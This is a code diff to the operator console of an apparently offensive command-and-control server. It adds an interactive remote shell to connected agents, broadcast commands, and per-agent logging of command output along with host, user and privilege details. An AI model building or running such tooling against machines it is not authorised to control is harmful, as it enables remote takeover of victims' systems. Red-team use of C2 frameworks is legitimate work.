@@ -1,6 +1,7 @@
-
 import json
 import time, sys
+from queue import Empty  # ← needed for inbox.get timeouts
+
 from c2.server.session import SessionRegistry
 from c2.server.protocol import exec_request
 from c2.server.transport import send_message
@@ -23,7 +24,7 @@ class CLI:
   broadcast <command>      Send shell command to all agents
   read <short_id>          Read next incoming message for agent (non-blocking)
   logs [n]                 Show last n lines from server.log (default 50)
-  talk                     Interactive shell with selected agent (not implemented)
+  talk <short_id>          Interactive shell with selected agent
   quit                     Shutdown server
 """)
 
@@ -35,7 +36,8 @@ class CLI:
         print(f"{'ShortID':10} {'Addr':22} {'Hostname':20} {'OS':15} {'User':15} {'Priv':7} {'PID':6} {'Connected'}")
         for a in agents:
             info = a.info.summary()
-            print(f"{a.short:10} {info['addr']:22} {str(info['hostname'])[0:19]:20} {str(info['os'])[0:14]:15} {str(info['username']):15} {str(info['privilege']):7} {str(info['pid']):6} {info['connected_at']}")
+            print(f"{a.short:10} {info['addr']:22} {str(info['hostname'])[0:19]:20} {str(info['os'])[0:14]:15} "
+                  f"{str(info['username']):15} {str(info['privilege']):7} {str(info['pid']):6} {info['connected_at']}")
 
     def select_agent(self, short_prefix: str):
         a = self.reg.get_by_short_prefix(short_prefix)
@@ -70,9 +72,10 @@ class CLI:
             with a.lock:
                 send_message(a.conn, payload)
             print(f"Sent command to {a.short}")
-            self.logger.info("Command sent to %s: %s", a.short, cmd)
+            # per-agent log
+            a.logger.info(">> %s", cmd)
         except Exception as e:
-            self.logger.exception("Failed to send command to %s: %s", a.short, e)
+            a.logger.exception("send failed: %s", e)
             print("Failed to send command.")
 
     def broadcast(self, cmd: str):
@@ -84,9 +87,9 @@ class CLI:
             try:
                 with a.lock:
                     send_message(a.conn, exec_request(cmd))
-                self.logger.info("Broadcast command to %s: %s", a.short, cmd)
+                a.logger.info(">> [broadcast] %s", cmd)
             except Exception as e:
-                self.logger.exception("Broadcast failed to %s: %s", a.short, e)
+                a.logger.exception("broadcast failed: %s", e)
         print("Broadcast sent.")
 
     def read_incoming(self, short_prefix: str):
@@ -99,14 +102,26 @@ class CLI:
         except Exception:
             print("No pending messages for that agent.")
             return
+
         print("Message:")
         print(json.dumps(msg, indent=2, ensure_ascii=False))
+
+        # Per-agent logging for exec_result
         if msg.get("type") == "exec_result":
-            p = msg.get("payload", {})
+            p = msg.get("payload", {}) or {}
+            rc = p.get("exit") if "exit" in p else p.get("returncode")
+            out = p.get("stdout", "") or ""
+            err = p.get("stderr", "") or ""
+            a.logger.info("<< exit=%s", rc if rc is not None else "?")
+            if out.strip():
+                a.logger.info("[STDOUT]\n%s", out)
+            if err.strip():
+                a.logger.info("[STDERR]\n%s", err)
+
             print("--- STDOUT ---")
-            print(p.get("stdout", ""))
+            print(out)
             print("--- STDERR ---")
-            print(p.get("stderr", ""))
+            print(err)
             print("--------------")
 
     def show_logs(self, n: int = 50):
@@ -121,39 +136,71 @@ class CLI:
     def interactive_talk(self, short_prefix: str):
         a = self.reg.get_by_short_prefix(short_prefix)
         if not a:
-            print("Agent not found by that short id."); return
+            print("Agent not found by that short id.")
+            return
+
         self.selected_id = a.info.id
         print(f"Interactive with {a.short} ({a.info.hostname}). Type ':quit' or CTRL+C to exit.")
+
         while True:
             try:
-                cmd = input(f"{a.short}$ ").strip()
+                prompt = f"{a.short}$ "
+                line = input(prompt)
+                # echo operator command so CLI recorder captures it
+                print(f"{prompt}{line}")
+                cmd = line.strip()
             except (KeyboardInterrupt, EOFError):
-                print("\nExiting."); break
-            if not cmd: 
+                print("\nExiting.")
+                break
+
+            if not cmd:
                 continue
             if cmd in (":quit", ":q", "quit", "exit"):
                 break
-            try:
-                with a.lock: 
-                    send_message(a.conn, exec_request(cmd))
-                self.logger.info("Interactive to %s: %s", a.short, cmd)
-            except Exception as e:
-                print(f"[send failed] {e}"); continue
 
-            # Wait for next exec_result, print raw stdout/stderr
+            # send
+            try:
+                with a.lock:
+                    send_message(a.conn, exec_request(cmd))
+                a.logger.info(">> %s", cmd)
+            except Exception as e:
+                print(f"[send failed] {e}")
+                a.logger.exception("interactive send failed: %s", e)
+                continue
+
+            # wait for result
             t0, timeout = time.time(), 30.0
             while True:
                 if time.time() - t0 > timeout:
-                    print("[timeout]"); break
+                    print("[timeout]")
+                    a.logger.warning("<< timeout waiting for result")
+                    break
                 try:
                     msg = a.inbox.get(timeout=0.2)
                 except Empty:
                     continue
+
                 if isinstance(msg, dict) and msg.get("type") == "exec_result":
-                    p = msg.get("payload", {})
-                    out, err = p.get("stdout", ""), p.get("stderr", "")
+                    p = msg.get("payload", {}) or {}
+                    out, err = p.get("stdout", "") or "", p.get("stderr", "") or ""
+                    rc = p.get("exit") if "exit" in p else p.get("returncode")
+
+                    # print to operator
                     if out:
                         sys.stdout.write(out + ("" if out.endswith("\n") else "\n")); sys.stdout.flush()
                     if err:
                         sys.stderr.write(err + ("" if err.endswith("\n") else "\n")); sys.stderr.flush()
-                    break        
+
+                    # per-agent log
+                    a.logger.info("<< exit=%s", rc if rc is not None else "?")
+                    if out.strip():
+                        a.logger.info("[STDOUT]\n%s", out)
+                    if err.strip():
+                        a.logger.info("[STDERR]\n%s", err)
+                    break
+                else:
+                    # non-exec messages, log verbatim
+                    try:
+                        a.logger.info("[MSG]\n%s", json.dumps(msg, ensure_ascii=False))
+                    except Exception:
+                        a.logger.info("[MSG] %s", str(msg))
